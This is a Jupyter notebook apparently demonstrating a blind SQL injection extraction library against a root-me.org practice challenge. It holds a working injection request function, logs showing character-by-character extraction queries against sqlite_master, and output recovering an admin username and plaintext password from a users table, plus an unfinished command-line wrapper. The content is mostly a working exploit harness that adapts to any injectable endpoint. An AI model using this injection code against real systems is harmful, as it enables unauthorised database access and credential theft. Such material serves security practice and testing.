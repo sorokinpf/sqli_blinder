{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sqli_blinder\n",
    "import string\n",
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import logging\n",
    "logging.basicConfig(level=logging.WARNING)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def example_func(sql):\n",
    "    \"\"\"this function must return True for sql=`1=1` and False for sql=`1=0`\"\"\"\n",
    "    \n",
    "    http_proxy   = \"http://localhost:8080\"\n",
    "    proxyDict = { \n",
    "                 \"https\"   : http_proxy,    \n",
    "                 \"http\"   : http_proxy\n",
    "                }\n",
    "    #proxyDict = None\n",
    "\n",
    "    burp0_url = \"http://challenge01.root-me.org:80/web-serveur/ch19/?action=recherche\"\n",
    "    burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Origin\": \"http://challenge01.root-me.org\", \"Connection\": \"close\", \"Referer\": \"http://challenge01.root-me.org/web-serveur/ch19/?action=recherche\", \"Upgrade-Insecure-Requests\": \"1\"}\n",
    "    burp0_data = {\"recherche\": \"f' or (%s) -- \" % sql}\n",
    "    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,proxies=proxyDict)\n",
    "    \n",
    "    if r.status_code != 200:\n",
    "        raise Exception('code: %d, ошибка sql: %s'%(r.status_code,sql))\n",
    "    if \"Unable to prepare statement\" in r.text:\n",
    "        raise Exception('code: %d, ошибка sql: %s'%(r.status_code,sql))\n",
    "    if \"News system\" in r.text:\n",
    "        return True\n",
    "    else:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "sqlib = sqli_blinder.SQLiBlinder(example_func,'sqlite',get_long_strings=False,multithreaded=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),1,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62','63','64','65','66','67','68','69','6A','6B','6C','6D','6E','6F','70','71','72','73','74','75','76','77','78','79','7A','41','42','43','44','45','46','47','48','49','4A','4B','4C','4D','4E')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),1,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62','63','64','65','66','67','68','69','6A','6B','6C','6D','6E','6F')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),1,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),1,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:True\n",
      "WARNING:root:new subset: ['6', '7', '8', '9', 'a', 'b']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),1,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('36','37','38')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['6', '7', '8']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:True\n",
      "WARNING:root:new subset: ['9', 'a', 'b']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),1,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('39')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['9']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:True\n",
      "WARNING:root:new subset: ['a', 'b']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),1,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('61')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['a']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),2,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62','63','64','65','66','67','68','69','6A','6B','6C','6D','6E','6F','70','71','72','73','74','75','76','77','78','79','7A','41','42','43','44','45','46','47','48','49','4A','4B','4C','4D','4E','4F')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),2,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62','63','64','65','66','67','68','69','6A','6B','6C','6D','6E','6F')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),2,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),2,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:True\n",
      "WARNING:root:new subset: ['6', '7', '8', '9', 'a', 'b']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),2,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('36','37','38')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['6', '7', '8']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:True\n",
      "WARNING:root:new subset: ['9', 'a', 'b']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),2,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('39')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['9']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:True\n",
      "WARNING:root:new subset: ['a', 'b']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),2,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('61')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['a']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:True\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),3,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62','63','64','65','66','67','68','69','6A','6B','6C','6D','6E','6F','70','71','72','73','74','75','76','77','78','79','7A','41','42','43','44','45','46','47','48','49','4A','4B','4C','4D','4E','4F')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),3,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62','63','64','65','66','67','68','69','6A','6B','6C','6D','6E','6F')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),3,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:True\n",
      "WARNING:root:new subset: ['c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),3,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('63','64','65','66','67','68')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['c', 'd', 'e', 'f', 'g', 'h']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['c', 'd', 'e', 'f', 'g', 'h']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),3,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('63','64','65')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['c', 'd', 'e']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['c', 'd', 'e']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),3,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('63')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['c']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),4,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62','63','64','65','66','67','68','69','6A','6B','6C','6D','6E','6F','70','71','72','73','74','75','76','77','78','79','7A','41','42','43','44','45','46','47','48','49','4A','4B','4C','4D','4E','4F','50')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),4,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62','63','64','65','66','67','68','69','6A','6B','6C','6D','6E','6F','70')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),4,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('30','31','32','33','34','35','36','37','38','39','61','62','63')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:True\n",
      "WARNING:root:new subset: ['d', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),4,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('64','65','66','67','68','69')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['d', 'e', 'f', 'g', 'h', 'i']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['d', 'e', 'f', 'g', 'h', 'i']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),4,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('64','65','66')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['d', 'e', 'f']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n",
      "WARNING:root:new subset: ['d', 'e', 'f']\n",
      "WARNING:root:(SELECT hex(SUBSTR(CAST('abcd' AS TEXT),4,1)) FROM sqlite_master  ORDER BY sql limit 1 offset 1) not in ('64')\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['d']\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:False\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'abcd'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqlib.get_string('sqlite_master',\"'abcd'\",1,alphabet= [c for c in string.printable],order_by='sql')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "count 1\n",
      "length: 5\n",
      "length: 15\n",
      "['admin', 'c4K04dtIaJsuWdi']\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[['admin', 'c4K04dtIaJsuWdi']]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqlib.get(['username','password'],'users',where=\"username='admin'\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "usage: ipykernel_launcher.py [-h] [-t TABLE] [-c COLUMN] [-w WHERE]\n",
      "                             [--threads THREADS] --dbms\n",
      "                             {mysql,mssql,sqlite,oracle}\n",
      "                             {check,count,one,get}\n",
      "ipykernel_launcher.py: error: argument mode: invalid choice: '/Users/p.sorokin/Library/Jupyter/runtime/kernel-de751ca1-7c44-40a1-8bc3-f5cca5719359.json' (choose from 'check', 'count', 'one', 'get')\n"
     ]
    },
    {
     "ename": "SystemExit",
     "evalue": "2",
     "output_type": "error",
     "traceback": [
      "An exception has occurred, use %tb to see the full traceback.\n",
      "\u001b[0;31mSystemExit\u001b[0m\u001b[0;31m:\u001b[0m 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/p.sorokin/anaconda3/envs/cth_37/lib/python3.7/site-packages/IPython/core/interactiveshell.py:3334: UserWarning: To exit: use 'exit', 'quit', or Ctrl-D.\n",
      "  warn(\"To exit: use 'exit', 'quit', or Ctrl-D.\", stacklevel=1)\n"
     ]
    }
   ],
   "source": [
    "import argparse\n",
    "parser = argparse.ArgumentParser()\n",
    "\n",
    "## --check\n",
    "## --count \n",
    "## --one '--table' '--'\n",
    "## --get\n",
    "parser.add_argument(\"mode\",help=\"one of ['check','count','one','get']\",choices= ['check','count','one','get'])\n",
    "parser.add_argument(\"-t\",\"--table\",\n",
    "                    help = \"table nmae\");\n",
    "parser.add_argument(\"-c\",\"--column\",\n",
    "                    help=\"column names. For get mode could by comma separated array of columns\")\n",
    "parser.add_argument(\"-w\", \"--where\", \n",
    "                    help=\"where clause\")\n",
    "parser.add_argument(\"--threads\",help=\"number of threads\",type=int,)\n",
    "parser.add_argument('--dbms',help=\"DBMS\",choices= ['mysql','mssql','sqlite','oracle'],required=True)\n",
    "\n",
    "\n",
    "args = parser.parse_args()\n",
    "if args.threads <=0 :\n",
    "    print ('threads > 0')\n",
    "    exit(-1)\n",
    "if args.threads == 1:\n",
    "    multithreaded = False\n",
    "else:\n",
    "    multithreaded = True\n",
    "\n",
    "sqlib = sqli_blinder.SQLiBliner(request_func,args.dbms,multithreaded=multithreaded,threads=args.threads)\n",
    "\n",
    "if args.mode == 'check':\n",
    "    check = sqlib.check()\n",
    "    print (check)\n",
    "    exit(0)\n",
    "\n",
    "parser.parse_args('check')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
